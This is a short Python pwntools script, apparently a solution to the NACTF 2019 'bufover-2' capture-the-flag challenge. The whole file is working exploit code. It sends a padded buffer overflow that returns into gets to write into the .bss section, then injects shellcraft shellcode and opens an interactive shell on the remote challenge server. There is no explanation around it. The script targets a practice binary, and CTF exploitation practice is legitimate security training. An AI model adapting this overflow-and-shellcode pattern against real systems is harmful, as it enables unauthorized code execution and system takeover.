#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *

# context(log_level="debug", arch="", os="linux")
# p = process('./bufover-2')
p = remote('shell.2019.nactf.com', 31184)
elf = ELF('./bufover-2', checksec=False)
addr_vuln = 0x08049293
addr_bss = elf.bss()
plt_gets = elf.plt['gets']

pd = 'a' * 0x1c
pd += p32(plt_gets)
pd += p32(addr_vuln)
pd += p32(addr_bss + 4)
p.sendline(pd)

pd = asm(shellcraft.sh())
# gdb.attach(p, "b *0x080492CD\nc")
p.sendline(pd)
p.sendline('')
p.recv()
p.interactive()
